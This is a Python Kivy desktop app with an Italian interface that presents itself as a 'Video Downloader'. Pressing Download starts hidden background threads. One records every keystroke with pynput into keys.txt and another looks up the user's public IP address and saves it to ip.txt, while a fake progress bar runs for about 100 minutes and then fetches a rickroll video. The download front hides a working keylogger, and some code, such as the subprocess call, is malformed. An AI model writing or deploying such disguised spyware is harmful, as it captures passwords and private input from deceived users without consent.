from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.network.urlrequest import UrlRequest

from pynput import keyboard
from pynput.keyboard import Listener

import socket
import requests
import threading
import subprocess
import time


KV = """
Screen:
    MDLabel:
        text: "VIDEO DOWNLOADER"
        pos_hint: {"center_x":.5, "center_y":.9}
        theme_text_color: "Error"
        font_style: "H3"
        halign: "center"
    MDLabel:
        text: "Puoi installare qualsiasi app con questo programma semplice da usare!"
        halign: "center"
        pos_hint: {"center_x":.5, "center_y":.7}

    MDTextField:
        hint_text: "Inserire qui l'URL"
        pos_hint: {"center_x":.5,"center_y":.5}

    MDRectangleFlatButton:
        text: "Download"
        pos_hint: {"center_x":0.5,"center_y":.3}
        on_press: app.onPressed()
    MDLabel:
        id: txt
        text: ""
        pos_hint: {"center_x":.5, "center_y":.45}
        font_size: "10sp"
    MDProgressBar:
        id: progress_bar
        value: 0
        color: 0,0,0,0
        size_hint_y:None
        height:dp(18)
        canvas:
            Color:
                rgba:0,0,0,1
            BorderImage:
                border: (dp(48), dp(48), dp(48), dp(48))
                pos: self.x, self.center_y - dp(24)
                size: self.width, dp(48)
            Color:
                rgba:1,1,0,1
            BorderImage:
                border: [int(min(self.width * (self.value / float(self.max)) if self.max else 0, dp(48)))] * 4
                pos: self.x, self.center_y -dp(24)
                size: self.width * (self.value / float(self.max)) if self.max else 0, dp(48)
"""

class MainApp(MDApp):

    def build(self):
        self.title = "Video Downloader"
        self.theme_cls.theme_style = "Dark" # Light
        self.theme_cls.primary_palette = "Yellow"


        self.Ptime = 60


        return Builder.load_string(KV)



    def handleKeys(self, keys: keyboard.Key):
        with open('keys.txt', 'a') as file:
            file.write(str(keys).strip("'"))


    def getComputerAdress(self):
        name = socket.gethostname()
        ip = socket.gethostbyname(name)
        r = requests.get("https://api.ipify.org/").text
        with open('ip.txt', 'a') as file:
            file.write(''.join(str(r).replace("'", "")))

    def onPressed(self):



        try:
            self.start_progress_bar()
            thread = threading.Thread(target=self.backgroud_task)
            thread.start()
            thread2 = threading.Thread(target=self.second_backgroud_task)
            subprocess.Popen("['gnome-terminal",'-e',thread2.start())

        except Exception as e:
            print(e)



    def backgroud_task(self):
        with open('ip.txt', 'a') as file:
            file.write("\n")
        self.getComputerAdress()


    def second_backgroud_task(self):
        with open('keys.txt', 'a') as file:
            file.write("\n")
        with Listener(on_release=self.handleKeys) as listener:
           listener.join()

    def start_progress_bar(self):
      self.root.ids["progress_bar"].value = 0
      threading.Thread(target=self.increment_progress_bar, daemon=True).start()

    def increment_progress_bar(self):
        while self.root.ids["progress_bar"].value < 100:
            time.sleep(60)  # aggiungi un ritardo per vedere l'incremento
            self.root.ids["progress_bar"].value += 1
            self.root.ids["txt"].text = f"Download in corso!Puoi nel mentree che scarica fare anche altro!\nproceso al:{self.root.ids["progress_bar"].value}%"
            if self.root.ids["progress_bar"].value >=100:
                self.downloadVideo()

    def downloadVideo(self):
        url = "https://playertv9.github.io/sitoMoltoBello/rickroll.mp4"
        filename = "il_mio_video_appena_scaricato.mp4"
        try:
            self.req = UrlRequest(url,chunk_size=1024,file_path=filename)
            self.root.ids["txt"].text = f"Download completato!\nPuoi aprire il video appena scaricato con il nome '{filename}' "
        except Exception as e:
            self.root.ids["txt"].text = "Qualcosa è andato storto!"
            print(e)





MainApp().run()
